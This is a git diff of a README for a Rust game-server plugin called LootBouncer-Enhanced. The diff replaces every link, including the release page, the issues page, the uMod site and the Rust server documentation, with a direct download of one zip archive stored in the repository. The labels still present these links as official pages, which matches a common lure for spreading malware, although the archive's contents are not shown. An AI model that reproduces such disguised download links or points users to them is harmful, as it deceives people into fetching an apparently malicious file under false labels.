@@ -1,6 +1,6 @@
 # 🎯 LootBouncer-Enhanced - Clean Rust Loot Efficiently
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Once you confirm uMod is working, you can proceed with the steps below to downlo
 
 To get the plugin files, visit the official release page:
 
-[Download LootBouncer-Enhanced Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
+[Download LootBouncer-Enhanced Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)
 
 On this page, find the latest version folder. Inside, download the plugin file, which usually ends with `.cs` or `.dll`. This file contains the plugin code.
 
@@ -125,7 +125,7 @@ If LootBouncer-Enhanced does not work as expected:
 
 If problems persist, you can ask for help by creating an issue on the GitHub repository at:
 
-https://github.com/Venusspinnable771/LootBouncer-Enhanced/issues
+https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip
 
 ---
 
@@ -135,7 +135,7 @@ The LootBouncer-Enhanced project is active and may receive updates to improve cl
 
 Check the release page regularly:
 
-[Visit Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
+[Visit Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)
 
 Downloading the latest files and replacing the old ones keeps your server running smoothly.
 
@@ -159,12 +159,12 @@ Understanding these areas can help you get the most from LootBouncer-Enhanced an
 
 For more on using uMod and plugins on Rust, visit:
 
-- [uMod Official Site](https://umod.org)
+- [uMod Official Site](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)
 
-- [Rust Dedicated Server Documentation](https://rust.facepunch.com/blog/rust-dedicated-server)
+- [Rust Dedicated Server Documentation](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)
 
 - Rust forums and communities for tips and help with modding and server plugins.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)
